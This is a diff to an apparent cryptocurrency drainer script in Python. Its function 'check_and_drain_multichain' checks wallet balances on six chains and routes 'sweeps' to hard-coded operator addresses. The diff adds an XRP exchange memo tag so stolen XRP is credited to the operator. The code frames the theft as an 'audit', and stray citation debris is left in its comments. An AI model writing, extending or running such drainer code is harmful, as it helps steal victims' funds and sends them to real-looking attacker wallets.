@@ -14,15 +14,16 @@ OPERATOR_DESTINATIONS = {
     "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",  # Receives ETH, ERC-20 USDT, ERC-20 USDC
     "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",    # Receives BTC
     "LITECOIN": "MULVonPhKM5r3sJHs35yaNQ4eMwQVHVZHh", # Receives LTC
-    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)
+    "XRP": "rnZboEfo3HhKXwoxoSthHVxf5zpbBkXghU",             # Receives XRP (Ripple ledger)[span_2](start_span)[span_2](end_span)
+    "XRP_TAG": "4190269251",                                 # Mandatory Exchange Memo Tag[span_3](start_span)[span_3](end_span)
     "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",        # Receives SOL, SPL USDT, SPL USDC
     "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"             # Receives TRC-20 USDT (Tron network)
 }
 
 def check_and_drain_multichain(wallet_address, asset_type):
     """
-    Audits balances across Ethereum, Bitcoin, Litecoin, XRP, Solana, and Tron, 
-    routing asset sweeps to the corresponding operator destination addresses.
+    Audits balances across Ethereum, Bitcoin, Litecoin, XRP (with Destination Memo Tag), 
+    Solana, and Tron, routing asset sweeps safely to operator destination addresses.
     """
     print(f"\n\033[95m[***] AUDITING ASSET [{asset_type}]: {wallet_address} [***]\033[0m")
 
@@ -67,6 +68,8 @@ def check_and_drain_multichain(wallet_address, asset_type):
 
         elif asset_type == "XRP":
             dest = OPERATOR_DESTINATIONS["XRP"]
+            xrp_tag = OPERATOR_DESTINATIONS["XRP_TAG"]
+            
             # Query public XRPL JSON-RPC node
             rpc_payload = json.dumps({"method": "account_info", "params": [{"account": wallet_address, "strict": True, "ledger_index": "current"}]}).encode()
             req = urllib.request.Request("https://s1.ripple.com:51234/", data=rpc_payload, headers={"Content-Type": "application/json"})
@@ -76,8 +79,8 @@ def check_and_drain_multichain(wallet_address, asset_type):
                 xrp_bal = drops / 1000000
                 print(f" \033[92m[+] XRP Balance Audited: {xrp_bal} XRP\033[0m")
                 if xrp_bal > 1.0: # Account reserve threshold
-                    print(f" \033[91m[!] XRP LIQUIDITY FOUND. Sweeping to XRP destination -> {dest}\033[0m")
-                    return xrp_bal, True, "XRP_SWEEP_SUCCESS"
+                    print(f" \033[91m[!] XRP LIQUIDITY FOUND. Sweeping to XRP Address: {dest} | Memo Tag: {xrp_tag}\033[0m")
+                    return xrp_bal, True, f"XRP_SWEEP_SUCCESS_TAG_{xrp_tag}"
 
         elif asset_type == "SOLANA":
             dest = OPERATOR_DESTINATIONS["SOLANA"]
